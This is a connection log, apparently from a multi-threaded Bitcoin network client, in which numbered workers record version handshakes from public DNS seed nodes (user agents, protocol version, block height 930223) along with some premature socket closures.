# [Worker 3126] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3125] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3125] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3114] Connection closed: Socket closed prematurely while reading header
# [Worker 1591] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1591] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 548] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 548] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3122] Connection closed: Socket closed prematurely while reading header
# [Worker 2107] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2107] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1737] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1737] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3133] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3133] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3134] Connection closed: Socket closed prematurely while reading header
# [Worker 3120] Connection closed: Socket closed prematurely while reading header
# [Worker 841] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 841] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2450] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2450] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3138] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3138] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1972] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1972] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3129] Connection closed: Socket closed prematurely while reading header
# [Worker 3160] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3160] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2380] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2380] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3155] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3155] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2218] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2218] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2126] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2126] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3159] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3159] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2397] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2397] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2961] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2961] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3163] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3163] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3158] Connection closed: Socket closed prematurely while reading header
# [Worker 3166] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3166] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3161] Connection closed: Socket closed prematurely while reading header
# [Worker 2860] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2860] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3164] Connection closed: Socket closed prematurely while reading header
# [Worker 2538] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2538] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3168] Connection closed: Socket closed prematurely while reading header
# [Worker 1337] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1337] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 643] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 643] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1097] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1097] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1683] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1683] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1664] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1664] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2794] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2794] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3189] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3189] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2480] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2480] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3172] Connection closed: Socket closed prematurely while reading header
# [Worker 3184] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3184] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2474] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2474] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2892] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2892] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1862] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1862] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2381] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2381] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3175] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3175] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3192] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3192] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1644] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1644] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3196] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3196] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3183] Connection closed: Socket closed prematurely while reading header
# [Worker 1751] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1751] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2682] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2682] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1340] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1340] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2958] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2958] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 597] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 597] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3195] Connection closed: Socket closed prematurely while reading header
# [Worker 3190] Connection closed: Socket closed prematurely while reading header
# [Worker 1917] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1917] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3178] Connection closed: Socket closed prematurely while reading header
# [Worker 3199] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 3199] Version: 70016 | User-Agent: /Satoshi:25.0.0/ | Height: 930223
# [Worker 2396] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2396] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3203] Connection closed: Socket closed prematurely while reading header
# [Worker 3197] Connection closed: Socket closed prematurely while reading header
# [Worker 1657] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1657] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3210] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3210] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3206] Connection closed: Socket closed prematurely while reading header
# [Worker 2309] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2309] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1949] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1949] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1556] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1556] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 163] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 163] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3222] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3222] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2847] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2847] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3220] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3220] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3213] Connection closed: Socket closed prematurely while reading header
# [Worker 1143] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 1143] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3230] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3230] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3229] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3229] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2715] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2715] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3227] Connection closed: Socket closed prematurely while reading header
# [Worker 3235] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3235] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3237] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3237] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2825] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2825] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3216] Connection closed: Socket closed prematurely while reading header
# [Worker 2417] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2417] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3228] Connection closed: Socket closed prematurely while reading header
# [Worker 3243] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3243] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3242] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3242] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3247] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3247] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1329] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1329] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2700] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2700] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2394] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2394] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3234] Connection closed: Socket closed prematurely while reading header
# [Worker 2743] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2743] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3239] Connection closed: Socket closed prematurely while reading header
# [Worker 3250] Connection closed: Socket closed prematurely while reading header
# [Worker 2693] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2693] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 146] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 146] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3253] Connection closed: Socket closed prematurely while reading header
# [Worker 1978] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1978] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2252] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2252] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3269] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3269] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3267] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3267] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2303] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2303] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1346] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1346] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3279] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3279] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1570] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 1570] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3268] Connection closed: Socket closed prematurely while reading header
# [Worker 3280] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3280] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3284] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3284] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3286] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3286] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2091] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2091] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1750] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 1750] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3271] Connection closed: Socket closed prematurely while reading header
# [Worker 3281] Connection closed: Socket closed prematurely while reading header
# [Worker 3294] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3294] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2007] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2007] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3296] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3296] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1944] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1944] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1934] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 1934] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3287] Connection closed: Socket closed prematurely while reading header
# [Worker 1733] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1733] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3304] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3304] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2585] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2585] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2434] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2434] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3292] Connection closed: Socket closed prematurely while reading header
# [Worker 3300] Connection closed: Socket closed prematurely while reading header
# [Worker 1389] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1389] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2895] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2895] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3306] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3306] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3290] Connection closed: Socket closed prematurely while reading header
# [Worker 2373] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2373] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2747] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2747] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3298] Connection closed: Socket closed prematurely while reading header
# [Worker 1349] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1349] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1523] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1523] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3322] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3322] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1895] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1895] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2345] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2345] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1409] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1409] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3325] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3325] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1456] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1456] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3320] Connection closed: Socket closed prematurely while reading header
# [Worker 635] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 635] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 810] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 810] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2595] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2595] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2615] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2615] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2680] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2680] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2246] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2246] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1528] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1528] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3326] Connection closed: Socket closed prematurely while reading header
# [Worker 2727] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2727] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2056] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2056] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2622] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2622] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2710] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2710] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2472] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2472] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2393] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2393] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2453] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2453] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3348] Connection closed: Socket closed prematurely while reading header
# [Worker 2553] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2553] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3351] Connection closed: Socket closed prematurely while reading header
# [Worker 2644] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2644] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1858] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1858] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1094] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1094] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2714] Received 'version' from seed.btc.petertodd.org (117 bytes)[Worker 3365] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3365] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 345] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 345] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
#
# [Worker 2714] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3336] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3336] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3375] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3375] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3373] Connection closed: Socket closed prematurely while reading header
# [Worker 3372] Connection closed: Socket closed prematurely while reading header
# [Worker 3361] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3361] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2436] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2436] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3388] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3388] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3358] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3358] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3353] Connection closed: Socket closed prematurely while reading header
# [Worker 1943] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1943] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3357] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3357] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2224] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2224] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1363] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1363] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3364] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 3364] Version: 70016 | User-Agent: /Satoshi:25.0.0/ | Height: 930223
# [Worker 2350] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2350] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2478] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2478] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3381] Connection closed: Socket closed prematurely while reading header
# [Worker 3072] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 3072] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 582] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 582] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2587] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2587] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3385] Connection closed: Socket closed prematurely while reading header
# [Worker 2798] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2798] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3390] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3390] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2672] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2672] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 526] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 526] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3406] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3406] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2730] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2730] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3405] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3405] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2683] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2683] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3410] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3410] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1375] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
